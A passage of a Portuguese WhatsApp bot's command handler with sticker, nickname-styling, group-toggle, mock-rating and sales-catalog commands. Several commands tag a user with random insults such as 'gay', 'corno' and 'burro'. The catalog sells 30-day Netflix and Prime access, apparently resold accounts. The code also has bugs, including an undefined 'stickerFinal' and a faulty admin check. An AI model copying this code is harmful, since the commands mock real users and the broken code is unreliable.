case 'figu_flork':
case 'figu_emoji': {
try {;

const qtd = Number(q);

if (!qtd) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix + command} 5`);
if (qtd >= 20) return reply('Coloque abaixo de 20..');

const categoria = command.replace('figu_', '');
const pasta = path.join(process.cwd(), 'stickers', categoria);

if (!fs.existsSync(pasta)) {
return reply(`A pasta stickers/${categoria} não existe.`);
}

const arquivos = fs.readdirSync(pasta).filter(file => file.endsWith('.webp'));

if (arquivos.length < 1) {
return reply(`Não tem figurinhas .webp no datacenter/${categoria}.`);
}

await reply(isGroup
? `⌛ | *_Estou enviando ${qtd} figurinhas no seu PV, aguarde..._*`
: `⌛ | *_Enviando..._*`
);

await conn.sendMessage(from, {
react: { text: '❤️‍🔥', key: info.key }
});

for (let i = 0; i < qtd; i++) {
await sleep(1000);

const aleatoria = arquivos[Math.floor(Math.random() * arquivos.length)];
const caminho = path.join(pasta, aleatoria);

await conn.sendMessage(sender, {
sticker: fs.readFileSync(caminho)
}, { quoted: selo });
}

} catch (e) {
console.log('[ERRO FIGU CATEGORIA]', e);
reply('Erro ao enviar figurinhas.');
}
break;
}

case 'figurinhas':
case 'figuale': {
try {;

const qtd = Number(q);

if (!qtd) return reply(`Digite a quantidade de figurinhas\nExemplo: ${prefix + command} 5`);

if (qtd >= 20) return reply('Coloque abaixo de 20..');

const pasta = path.join(process.cwd(), 'stickers');

if (!fs.existsSync(pasta)) {
return reply('A pasta stickers não existe.');
}

const arquivos = fs.readdirSync(pasta).filter(file => file.endsWith('.webp'));

if (arquivos.length < 1) {
return reply('Não tem figurinhas .webp no datacenter.');
}

await reply(isGroup
? `⌛ | *_Estou enviando ${qtd} figurinhas no seu PV, aguarde..._*`
: `⌛ | *_Enviando..._*`
);

await conn.sendMessage(from, {
react: { text: '🔥', key: info.key }
});

for (let i = 0; i < qtd; i++) {
await sleep(1000);

const aleatoria = arquivos[Math.floor(Math.random() * arquivos.length)];
const caminho = path.join(pasta, aleatoria);

await conn.sendMessage(sender, {
sticker: fs.readFileSync(caminho)
}, { quoted: selo });
}

} catch (e) {
console.log('[ERRO FIGURINHAS]', e);
reply('Erro ao enviar figurinhas.');
}
break;
}

case 'nick':
case 'fazernick': {
  try {
    if (!q) return reply('❌ Digite um nick');

    const n = q;

    const estilos = [
      { nome: "Negrito",      texto: `𝐀𝐁𝐂: ${n.split('').map(c => '𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Itálico",      texto: `𝘼𝘽𝘾: ${n.split('').map(c => '𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Gótico",       texto: `𝔄𝔅ℭ: ${n.split('').map(c => '𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Duplo",        texto: `𝔸𝔹ℂ: ${n.split('').map(c => '𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Fancy",        texto: `ᖴᗩᑎᑕY: ${n}` },
      { nome: "Negrito Itál", texto: `𝑨𝑩𝑪: ${n.split('').map(c => '𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Cursivo",      texto: `𝒜ℬ𝒞: ${n.split('').map(c => '𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵𝒶𝒷𝒸𝒹𝑒𝒻𝑔𝒽𝒾𝒿𝓀𝓁𝓂𝓃𝑜𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Monospace",    texto: `𝙰𝙱𝙲: ${n.split('').map(c => '𝙰𝙱𝙲𝙳𝙴𝙵𝙶𝙷𝙸𝙹𝙺𝙻𝙼𝙽𝙾𝙿𝚀𝚁𝚂𝚃𝚄𝚅𝚆𝚇𝚈𝚉𝚊𝚋𝚌𝚍𝚎𝚏𝚐𝚑𝚒𝚓𝚔𝚕𝚖𝚗𝚘𝚙𝚚𝚛𝚜𝚝𝚞𝚟𝚠𝚡𝚢𝚣'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Círculo",      texto: `Ⓐ: ${n.split('').map(c => 'ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Quadrado",     texto: `🄰: ${n.split('').map(c => '🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉'['ABCDEFGHIJKLMNOPQRSTUVWXYZ'.indexOf(c.toUpperCase())] || c).join('')}` },
      { nome: "Small Caps",   texto: `ᴀʙᴄ: ${n.toLowerCase().split('').map(c => 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ'['abcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('')}` },
      { nome: "Invertido",    texto: `∀: ${n.split('').map(c => 'ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz'['abcdefghijklmnopqrstuvwxyz'.indexOf(c.toLowerCase())] || c).join('').split('').reverse().join('')}` }
    ];

    // função de conversão real
    const converter = (str, alfabeto) => {
      const base = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
      return str.split('').map(c => {
        const i = base.indexOf(c);
        return i !== -1 ? alfabeto[i] : c;
      }).join('');
    };

    const alfabetos = {
      negrito:     [...'𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳'],
      italico:     [...'𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘓𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻'],
      gotico:      [...'𝔄𝔅ℭ𝔇𝔈𝔉𝔊ℌℑ𝔍𝔎𝔏𝔐𝔑𝔒𝔓𝔔ℜ𝔖𝔗𝔘𝔙𝔚𝔛𝔜ℨ𝔞𝔟𝔠𝔡𝔢𝔣𝔤𝔥𝔦𝔧𝔨𝔩𝔪𝔫𝔬𝔭𝔮𝔯𝔰𝔱𝔲𝔳𝔴𝔵𝔶𝔷'],
      duplo:       [...'𝔸𝔹ℂ𝔻𝔼𝔽𝔾ℍ𝕀𝕁𝕂𝕃𝕄ℕ𝕆ℙℚℝ𝕊𝕋𝕌𝕍𝕎𝕏𝕐ℤ𝕒𝕓𝕔𝕕𝕖𝕗𝕘𝕙𝕚𝕛𝕜𝕝𝕞𝕟𝕠𝕡𝕢𝕣𝕤𝕥𝕦𝕧𝕨𝕩𝕪𝕫'],
      negbold:     [...'𝑨𝑩𝑪𝑫𝑬𝑭𝑮𝑯𝑰𝑱𝑲𝑳𝑴𝑵𝑶𝑷𝑸𝑹𝑺𝑻𝑼𝑽𝑾𝑿𝒀𝒁𝒂𝒃𝒄𝒅𝒆𝒇𝒈𝒉𝒊𝒋𝒌𝒍𝒎𝒏𝒐𝒑𝒒𝒓𝒔𝒕𝒖𝒗𝒘𝒙𝒚𝒛'],
      cursivo:     [...'𝒜ℬ𝒞𝒟ℰℱ𝒢ℋℐ𝒥𝒦ℒℳ𝒩𝒪𝒫𝒬ℛ𝒮𝒯𝒰𝒱𝒲𝒳𝒴𝒵𝒶𝒷𝒸𝒹𝑒𝒻𝑔𝒽𝒾𝒿𝓀𝓁𝓂𝓃𝑜𝓅𝓆𝓇𝓈𝓉𝓊𝓋𝓌𝓍𝓎𝓏'],
      mono:        [...'𝙰𝙱𝙲𝙳𝙴𝙵𝙶𝙷𝙸𝙹𝙺𝙻𝙼𝙽𝙾𝙿𝚀𝚁𝚂𝚃𝚄𝚅𝚆𝚇𝚈𝚉𝚊𝚋𝚌𝚍𝚎𝚏𝚐𝚑𝚒𝚓𝚔𝚕𝚖𝚗𝚘𝚙𝚚𝚛𝚜𝚝𝚞𝚟𝚠𝚡𝚢𝚣'],
      smallcaps:   [...'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ'],
    };

    const nicks = {
      negrito:   converter(n, alfabetos.negrito),
      italico:   converter(n, alfabetos.italico),
      gotico:    converter(n, alfabetos.gotico),
      duplo:     converter(n, alfabetos.duplo),
      negbold:   converter(n, alfabetos.negbold),
      cursivo:   converter(n, alfabetos.cursivo),
      mono:      converter(n, alfabetos.mono),
      smallcaps: converter(n, alfabetos.smallcaps),
      fancy:     n.split('').join('꧁꧂').replace('꧁꧂', ' '),
      circulo:   n.split('').map(c => 'ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ'['ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join(''),
      quadrado:  n.toUpperCase().split('').map(c => '🄰🄱🄲🄳🄴🄵🄶🄷🄸🄹🄺🄻🄼🄽🄾🄿🅀🅁🅂🅃🅄🅅🅆🅇🅈🅉'['ABCDEFGHIJKLMNOPQRSTUVWXYZ'.indexOf(c)] || c).join(''),
      invertido: n.toLowerCase().split('').map(c => 'ɐqɔpǝɟƃɥᴉɾʞlɯuodbɹsʇnʌʍxʎz'['abcdefghijklmnopqrstuvwxyz'.indexOf(c)] || c).join('').split('').reverse().join('')
    };

    await conn.sendMessage(from, {
      interactiveMessage: {
        title: `🎨 Nick: ${n}`,
        footer: `© ${NickDono} • Toque para copiar`,
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({
            bottom_sheet: {
              in_thread_buttons_limit: 3,
              list_title: "🎨 Estilos de Nick",
              button_title: "Ver estilos"
            }
          }),
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "🎨 Escolha e copie",
                sections: [
                  {
                    title: "✍️ Estilos disponíveis",
                    rows: [
                      { title: "𝐍𝐞𝐠𝐫𝐢𝐭𝐨",       description: nicks.negrito,   id: `nick_neg`   },
                      { title: "𝘐𝘵𝘢́𝘭𝘪𝘤𝘰",       description: nicks.italico,   id: `nick_ita`   },
                      { title: "𝔾ó𝕥𝕚𝕔𝕠",        description: nicks.gotico,    id: `nick_got`   },
                      { title: "𝔸𝔹ℂ Duplo",      description: nicks.duplo,     id: `nick_dup`   },
                      { title: "𝑵𝒆𝒈 𝑰𝒕𝒂́𝒍",     description: nicks.negbold,   id: `nick_nit`   },
                      { title: "𝒞𝓊𝓇𝓈𝒾𝓋𝑜",      description: nicks.cursivo,   id: `nick_cur`   },
                      { title: "𝙼𝚘𝚗𝚘𝚜𝚙𝚊𝚌𝚎",    description: nicks.mono,      id: `nick_mon`   },
                      { title: "ꜱᴍᴀʟʟ ᴄᴀᴘs",   description: nicks.smallcaps, id: `nick_sml`   },
                      { title: "Ⓒ í𝐫𝐜𝐮𝐥𝐨",     description: nicks.circulo,   id: `nick_cir`   },
                      { title: "🄱 Quadrado",     description: nicks.quadrado,  id: `nick_qua`   },
                      { title: "ɹoʇɐɹǝʌuI",     description: nicks.invertido, id: `nick_inv`   },
                    ]
                  }
                ]
              })
            },
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "📋 Copiar Negrito",
                copy_code: nicks.negrito
              })
            },
            {
              name: "cta_copy",
              buttonParamsJson: JSON.stringify({
                display_text: "📋 Copiar Gótico",
                copy_code: nicks.gotico
              })
            }
          ]
        }
      }
    }, { quoted: selo });

    // manda também no chat pra ver todos
    await reply(
`🎨 *GERADOR DE NICK* — ${n}

𝐍𝐞𝐠𝐫𝐢𝐭𝐨: ${nicks.negrito}
𝘐𝘵𝘢́𝘭𝘪𝘤𝘰: ${nicks.italico}
𝔾ó𝕥𝕚𝕔𝕠: ${nicks.gotico}
𝔸𝔹ℂ: ${nicks.duplo}
𝑵𝒆𝒈 𝑰𝒕𝒂́𝒍: ${nicks.negbold}
𝒞𝓊𝓇𝓈𝒾𝓋𝑜: ${nicks.cursivo}
𝙼𝚘𝚗𝚘: ${nicks.mono}
ꜱᴍᴀʟʟ: ${nicks.smallcaps}
Ⓒírculo: ${nicks.circulo}
🄱Quadrado: ${nicks.quadrado}
ɹoʇɐɹǝʌuI: ${nicks.invertido}`
    );

  } catch (e) {
    console.error(e);
    reply('❌ Erro ao gerar nick.');
  }
}
break;


case 'ativar': {
if(!isGroupAdmins || !So_Dono) return reply(msg.SoAdmins);
  try {
const fotogp = await conn.profilePictureUrl(from, 'image')
const fotogpt = await getBuffer(fotogp).catch(_ => FotoMenu)

    const media = await prepareWAMessageMedia(
      { image: fotogpt },
      { upload: conn.waUploadToServer }
    );

    const texto = `*SISTEMAS DO GRUPO*

Selecione o sistema que deseja ativar:`

    const botoes = [
      {
        name: "single_select",
        buttonParamsJson: JSON.stringify({
          title: "Gerenciar Sistemas",
          sections: [
            {
              title: "Funções",
              rows: [
                { title: "Anti - link", id: `${prefix}antilink 1` },
                { title: "Bem - vindo 1", id: `${prefix}bemvindo 1` },
                { title: "So Admins", id: `${prefix}so_adm 1`}
              ]
            }
          ]
        })
      }
    ];

    const card = {
      header: {
        hasMediaAttachment: true,
        imageMessage: media.imageMessage
      },
      headerType: "IMAGE",
      body: { text: texto },
      footer: { text: "Kyara-AI" },
      nativeFlowMessage: { buttons: botoes }
    };

    await conn.relayMessage(from, {
      interactiveMessage: {
        carouselMessage: { cards: [card] },
        body: { text: "Escolha um sistema 👇" }
      }
    }, {})

  } catch (e) {
    console.log(e)
    reply("Erro ao mostrar sistemas.")
  }
}
break;

case 'desativar': {
if(!isGroupAdmins || !So_Dono) return reply(msg.SoAdmins);
  try {
const fotogp = await conn.profilePictureUrl(from, 'image')
const fotogpt = await getBuffer(fotogp).catch(_ => FotoMenu)

 const media = await prepareWAMessageMedia(
      { image: fotogpt },
      { upload: conn.waUploadToServer }
    );

    const texto = `*SISTEMAS DO GRUPO*

Selecione o sistema que deseja desativar:`

    const botoes = [
      {
        name: "single_select",
        buttonParamsJson: JSON.stringify({
          title: "Gerenciar Sistemas",
          sections: [
            {
              title: "Funções",
              rows: [
                { title: "Anti - link", id: `${prefix}antilink 0` },
                { title: "Bem - vindo 1", id: `${prefix}bemvindo 0` },
                { title: "So Admins", id: `${prefix}so_adm 0`}
              ]
            }
          ]
        })
      }
    ];

    const card = {
      header: {
        hasMediaAttachment: true,
        imageMessage: media.imageMessage
      },
      headerType: "IMAGE",
      body: { text: texto },
      footer: { text: "Kyara-AI" },
      nativeFlowMessage: { buttons: botoes }
    };

    await conn.relayMessage(from, {
      interactiveMessage: {
        carouselMessage: { cards: [card] },
        body: { text: "Escolha um sistema 👇" }
      }
    }, {})

  } catch (e) {
    console.log(e)
    reply("Erro ao mostrar sistemas.")
  }
}
break;

case 'rename':
case 'name': {
  try {
    if (!isQuotedSticker) {
      return reply('❌ *ᴍᴀʀǫᴜᴇ ᴜᴍᴀ ғɪɢᴜʀɪɴʜᴀ ᴘᴀʀᴀ ʀᴇɴᴏᴍᴇᴀʀ.*');
    }

    if (!q) {
      return reply(`❌ *ꜰᴏʀᴍᴀᴛᴏ ɪɴᴠᴀʟɪᴅᴏ!*\n\n📌 Exemplo:\n${prefix + command} Pack/Autor`);
    }

    const [packname, author2] = q.split("/");

    if (!packname || !author2) {
      return reply(`❌ *ᴠᴏᴄᴇ ᴘʀᴇᴄɪꜱᴀ ᴅᴇꜰɪɴɪʀ ᴘᴀᴄᴋ ᴇ ᴀᴜᴛᴏʀ!*\n\n📌 Exemplo:\n${prefix + command} Kyara`);
    }

    await conn.sendMessage(from, { react: { text: "🎭", key: info.key } });

    const { writeExif2 } = require('./DATABASE2/sticker/exif.js');

    // Baixa o sticker da mensagem respondida
    const stickerMsg = info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage;
    const stickerBuffer = await getFileBuffer(stickerMsg, 'sticker');

    // Aplica os novos metadados (pack/autor)
    const stickerComExif = await writeExif2(
      { mimetype: 'image/webp', data: stickerBuffer },
      { packname: packname.trim(), author: author2.trim() }
    );

    // Envia
    await conn.sendMessage(from, {
      sticker: stickerFinal
    }, { quoted: selo });

    await conn.sendMessage(from, { react: { text: "✅", key: info.key } });

  } catch (e) {
    console.error(e);
    await conn.sendMessage(from, { react: { text: "❌", key: info.key } });
    reply('❌ *Erro ao renomear figurinha.*');
  }
}
break;

case 'st':
case 'stk':
case 'sticker':
case 's':
await conn.sendMessage(from, {react: {text: `⌛`, key: info.key}})
var RSM = info.message?.extendedTextMessage?.contextInfo?.quotedMessage
var boij2 = RSM?.imageMessage || info.message?.imageMessage || RSM?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessageV2?.message?.imageMessage || info.message?.viewOnceMessage?.message?.imageMessage || RSM?.viewOnceMessage?.message?.imageMessage
var boij = RSM?.videoMessage || info.message?.videoMessage || RSM?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessageV2?.message?.videoMessage || info.message?.viewOnceMessage?.message?.videoMessage || RSM?.viewOnceMessage?.message?.videoMessage
if(boij2){
var pack = ` ➤ 𝑺𝒐𝒍𝒊𝒄𝒊𝒕𝒂𝒅𝒐 𝒑𝒐𝒓:\n ➤ 𝑵𝒐𝒎𝒆 𝒅𝒐 𝑩𝒐𝒕:\n ➤ 𝑵𝒊𝒄𝒌 𝒅𝒐 𝑫𝒐𝒏𝒐:`
var author2 = ` 「 ${pushname} 」 \n「 ${NomeBot} 」\n「 ${NickDono} 」`
owgi = await getFileBuffer(boij2, 'image')
let encmediaa = await sendImageAsSticker2(conn, from, owgi, selo, { packname:pack, author:author2})
} else if(boij && boij.seconds < 11){
var pack = `➤ 𝑺𝒐𝒍𝒊𝒄𝒊𝒕𝒂𝒅𝒐 𝒑𝒐𝒓:`
var author2 = ` ${pushname}`
owgi = await getFileBuffer(boij, 'video')
let encmedia = await sendVideoAsSticker2(conn, from, owgi, selo, { packname:pack, author:author2})
} else {
return reply(`Marque uma imagem, ou um vídeo de ate 9.9 segundos, ou uma visualização única, para fazer figurinha, com o comando ${prefix+command}`)
}
break

case 'brat': {
if (!q) return reply(`Exemplo: ${prefix+command} Kyara`)

try {
const api = await fetch(`https://zone.api.br/api/brat?text=${encodeURIComponent(q)}`)
const data = await api.json()

let buffer = await getBuffer(data.imagem)

await sendImageAsSticker2(conn, from, data.imagem, info, {
packname: pack,
author: author2
})

} catch(e) {
console.log(e)
reply("❌ Erro ao gerar brat")
}
}
break

case 'bratvid': {
if (!q) return reply(`Exemplo: ${prefix+command} Kyara`)

try {

const axios = require('axios')

const { data } = await axios.get(
`https://zone.api.br/api/brat?text=${encodeURIComponent(q)}`,
{
timeout: 15000
}
)

if (!data.status) return reply("❌ API não respondeu")

let buffer = await getBuffer(data.imagem)

await sendImageAsSticker2(conn, from, data.imagem, info, {
packname: pack,
author: author2
})

} catch(e) {
console.log(e)
reply("❌ Erro ao gerar brat")
}

}
break

case 'toimg':
if(!isQuotedSticker) return reply('Por favor, *mencione um sticker* para executar o comando.')
try {
reply(msg.Download)
buff = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
conn.sendMessage(from, {image: buff}, {quoted: selo}).catch(e => {
console.log(e);
reply('Ocorreu um erro ao converter o *sticker para imagem.*')
})
} catch {
reply("Erro, tente mais tarde!")
}
break

case 'gay':
case 'feio':
case 'linda':
case 'lindo':
case 'corno':
case 'invejosa':
case 'invejoso':
case 'vesgo':
case 'chata':
case 'chato':
case 'burro': {
try {

const m = info;
const from = info.key.remoteJid;

let user =
info.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] ||
info.message?.extendedTextMessage?.contextInfo?.participant ||
info.key.participant ||
info.key.remoteJid;

if (!user) return reply("❌ Marque ou responda alguém.");

const num = user.split("@")[0];
const nomeAlvo = num;
const porcent = Math.floor(Math.random() * 100) + 1;

const caminhos = {
  gay: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/gay.mp4",
  feio: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/feio.mp4",
  linda: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/linda.mp4",
  lindo: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/lindo.mp4",
  corno: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/corno.mp4",
  invejosa: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/invejosa.mp4",
  invejoso: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/invejoso.mp4",
  vesgo: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/vesgo.mp4",
  chata: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/chata.mp4",
  chato: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/chato.mp4",
  burro: "/storage/emulated/0/Kyara❤️‍🔥/Kyara/gifs/burro.mp4"
};

const frases = {
  gay: `🏳️‍🌈 @${nomeAlvo} passou no teste supremo e foi detectado com *${porcent}% de gayzisse* 🤯🌈`,
  feio: `🤢 Os cientistas analisaram @${nomeAlvo} e descobriram *${porcent}% de feiura rara* 💀`,
  linda: `😍 A NASA confirmou que @${nomeAlvo} possui *${porcent}% de beleza cósmica* ✨💖`,
  lindo: `😎 @${nomeAlvo} tem *${porcent}% de beleza premium* 🗿🍷`,
  corno: `🐂 Após uma investigação profunda, foi descoberto que @${nomeAlvo} é *${porcent}% corno certificado* 🤠`,
  invejosa: `😒 @${nomeAlvo} acumula impressionantes *${porcent}% de inveja* 📈💅`,
  invejoso: `😒 Os radares detectaram *${porcent}% de inveja* em @${nomeAlvo} 🚨`,
  vesgo: `👀 @${nomeAlvo} está olhando para duas dimensões ao mesmo tempo: *${porcent}% vesgo* 🤣`,
  chata: `🙄 O medidor de paciência explodiu! @${nomeAlvo} atingiu *${porcent}% de chatice* 💥`,
  chato: `🙄 Foi registrado *${porcent}% de chatice extrema* em @${nomeAlvo} ⚠️`,
  burro: `🐴 Segundo os cálculos mais avançados, @${nomeAlvo} possui *${porcent}% de burrice* 📚❌`
};

const caminho = caminhos[command];
const texto = frases[command];

if (caminho && fs.existsSync(caminho)) {
await conn.sendMessage(from, {
  video: fs.readFileSync(caminho),
  gifPlayback: true,
  caption: texto,
  mentions: [user]
}, { quoted: m });
} else {
await conn.sendMessage(from, {
  text: texto + "\n\n❌ Vídeo não encontrado.",
  mentions: [user]
}, { quoted: m });
}

} catch (e) {
console.log(e);
reply("❌ Erro.");
}
}
break;

case 'catalogo': {
try {
  await reagir(from, "🛒")

  const { proto } = baileys

  const imgMenuP = './dono/menus/Foto-menu/img-menu.jpg'
  const imgMenuAdm = './dono/menus/Foto-menu/menu-adm.jpg'
  const imgMenuDono = './dono/menus/Foto-menu/menu-dono.jpg'

  const upload = conn.waUploadToServer

  const carregarImg = async (arquivo) => {
    return await prepareWAMessageMedia(
      { image: fs.readFileSync(arquivo) },
      { upload }
    )
  }

  const mediaP = fs.existsSync(imgMenuP) ? await carregarImg(imgMenuP) : null
  const mediaAdm = fs.existsSync(imgMenuAdm) ? await carregarImg(imgMenuAdm) : mediaP
  const mediaDono = fs.existsSync(imgMenuDono) ? await carregarImg(imgMenuDono) : mediaP

  if (!mediaP) return reply('❌ Imagem do catálogo não encontrada em:\n./dono/menus/Foto-menu/img-menu.jpg')

  const cards = []

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaP.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 🛒 CATÁLOGO KYARA 〕━━⬣
┃
┃ 🤖 *BOT PERSONALIZÁVEL*
┃ 💰 Valor: R$ 25,00
┃
┃ Bot feito do seu jeito:
┃ nome, menu, comandos, sistemas
┃ e personalização básica.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 1 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Bot",
            id: `${prefix}comprar 1`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaP.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 🌐 SITE HTML 〕━━⬣
┃
┃ 🌐 *Site HTML*
┃ 💰 Valor: R$ 100,00
┃
┃ Site personalizado em HTML,
┃ ideal para portfólio, loja,
┃ página de vendas ou projeto.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 2 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Site",
            id: `${prefix}comprar 2`
          })
        }
      ]
    })
  })

  cards.push({
    header: proto.Message.InteractiveMessage.Header.create({
      title: '',
      hasMediaAttachment: true,
      imageMessage: mediaAdm.imageMessage
    }),
    body: proto.Message.InteractiveMessage.Body.create({
      text: `╭━━〔 📺 STREAMING 〕━━⬣
┃
┃ 📺 *Netflix + Prime 30 Dias*
┃ 💰 Valor: R$ 15,00
┃
┃ Acesso por 30 dias.
┃ Produto entregue após confirmação.
┃
╰━━━━━━━━━━━━━━⬣`
    }),
    footer: proto.Message.InteractiveMessage.Footer.create({
      text: 'Produto 3 • Kyara Store'
    }),
    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
      buttons: [
        {
          name: "quick_reply",
          buttonParamsJson: JSON.stringify({
            display_text: "🛒 Comprar Streaming",
            id: `${prefix}comprar 3`
          })
        }
      ]
    })
  })

  cards.push({
